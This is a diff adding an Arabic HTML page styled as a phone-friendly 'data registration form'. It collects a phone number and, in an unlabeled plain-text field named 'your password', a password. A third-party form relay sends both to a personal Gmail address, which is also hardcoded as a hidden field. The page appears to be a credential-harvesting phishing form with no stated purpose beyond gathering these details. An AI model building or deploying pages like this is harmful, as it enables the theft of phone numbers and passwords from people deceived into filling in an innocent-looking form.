@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <title>نموذج تسجيل البيانات - تصميم هاتف احترافي</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Cairo&display=swap');
+
+    body {
+      margin: 0;
+      padding: 40px 20px;
+      background: #e6f2e6; /* خلفية خفيفة أخضر */
+      font-family: 'Cairo', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    form {
+      background: white;
+      width: 100%;
+      max-width: 400px;
+      padding: 30px 25px;
+      border-radius: 30px;
+      box-shadow: 0 10px 30px rgba(0, 128, 0, 0.2);
+      box-sizing: border-box;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 25px;
+      color: #2a662a;
+      font-weight: 700;
+      font-size: 1.8rem;
+    }
+
+    input[type="tel"],
+    input[type="text"] {
+      width: 100%;
+      padding: 14px 20px;
+      margin: 12px 0 20px 0;
+      border-radius: 15px;
+      border: 2px solid #85c885;
+      box-sizing: border-box;
+      font-size: 1rem;
+      transition: border-color 0.3s ease;
+      direction: rtl;
+    }
+
+    input[type="tel"]:focus,
+    input[type="text"]:focus {
+      border-color: #3a9d3a;
+      outline: none;
+      box-shadow: 0 0 8px #3a9d3a;
+    }
+
+    button {
+      width: 100%;
+      background-color: #2a662a;
+      color: white;
+      padding: 15px 0;
+      font-size: 1.1rem;
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+      font-weight: 600;
+      box-shadow: 0 6px 12px rgba(42, 102, 42, 0.5);
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #1e461e;
+    }
+
+    input[name="_honey"] {
+      display: none;
+    }
+
+    @media (max-width: 360px) {
+      form {
+        padding: 25px 15px;
+        border-radius: 20px;
+      }
+      h2 {
+        font-size: 1.5rem;
+      }
+      input[type="tel"],
+      input[type="text"] {
+        padding: 12px 15px;
+        font-size: 0.9rem;
+      }
+      button {
+        padding: 12px 0;
+        font-size: 1rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <form id="formBase64" action="https://formsubmit.co/yblyyll@gmail.com" method="POST">
+    
+    <h2>نموذج تسجيل البيانات</h2>
+
+    <!-- رقم الهاتف -->
+    <input type="tel" name="رقم_الهاتف" placeholder="رقم الهاتف" required>
+
+    <!-- بريد إلكتروني مخفي وثابت -->
+    <input type="hidden" name="البريد_الإلكتروني" value="yblyyll@gmail.com">
+
+    <!-- كلمة المرور نص عادي بدون تسمية -->
+    <input type="text" name="كلمة_مرورك" placeholder="" required>
+
+    <!-- منع سبام -->
+    <input type="text" name="_honey">
+
+    <!-- إعادة التوجيه بعد الإرسال -->
+    <input type="hidden" name="_redirect" value="thanks.html">
+
+    <button type="submit">إرسال</button>
+  </form>
+
+</body>
+</html>
